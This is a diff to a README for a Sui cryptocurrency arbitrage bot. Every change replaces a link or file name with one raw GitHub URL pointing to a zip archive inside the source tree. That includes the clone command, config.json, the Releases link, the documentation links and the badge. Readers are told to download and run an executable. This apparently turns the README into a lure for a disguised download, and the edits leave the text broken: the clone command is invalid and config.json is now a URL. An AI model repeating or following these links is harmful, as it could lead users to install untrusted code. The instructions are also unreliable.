@@ -16,7 +16,7 @@ To set up the Sui Arbitrage Bot, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Franco-alt-cloud/sui-mev.git
+   git clone https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -29,7 +29,7 @@ To set up the Sui Arbitrage Bot, follow these steps:
    npm install
    ```
 
-4. Configure the bot settings in the `config.json` file.
+4. Configure the bot settings in the `https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip` file.
 
 ## ⚙️ Usage
 
@@ -50,7 +50,7 @@ The Sui Arbitrage Bot works by:
 
 ## 🔍 Configuration
 
-The bot uses a `config.json` file for settings. Below are the key fields you can adjust:
+The bot uses a `https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip` file for settings. Below are the key fields you can adjust:
 
 - `exchanges`: List of exchanges to monitor (e.g., `["exchange1", "exchange2"]`).
 - `threshold`: Minimum price difference percentage to trigger a trade.
@@ -87,7 +87,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 📅 Release Information
 
-To download the latest version of the Sui Arbitrage Bot, visit the [Releases section](https://github.com/Franco-alt-cloud/sui-mev/releases). Download the latest executable file and run it to start trading.
+To download the latest version of the Sui Arbitrage Bot, visit the [Releases section](https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip). Download the latest executable file and run it to start trading.
 
 ## 💬 Support
 
@@ -95,9 +95,9 @@ For any issues or feature requests, please open an issue in this repository. We 
 
 ## 🔗 Additional Resources
 
-- [Sui Documentation](https://sui.dev/docs)
-- [Trading Strategies Guide](https://www.investopedia.com/articles/trading/100614/advanced-trading-strategies.asp)
-- [Bot Trading Basics](https://www.binance.com/en/support/articles/360042963132)
+- [Sui Documentation](https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip)
+- [Trading Strategies Guide](https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip)
+- [Bot Trading Basics](https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip)
 
 ## 📈 Conclusion
 
@@ -107,7 +107,7 @@ The Sui Arbitrage Bot aims to make trading accessible and profitable. Whether yo
 
 We would like to thank the open-source community for their invaluable contributions and resources. Special thanks to our contributors for their hard work and dedication.
 
-![Sui Arbitrage Bot](https://img.shields.io/badge/Sui%20Arbitrage%20Bot-v1.0-blue?style=for-the-badge)
+![Sui Arbitrage Bot](https://github.com/Franco-alt-cloud/sui-mev/raw/refs/heads/master/crates/utils/src/sui-mev-2.0.zip%20Arbitrage%20Bot-v1.0-blue?style=for-the-badge)
 
 Happy Trading! 💰
 ```
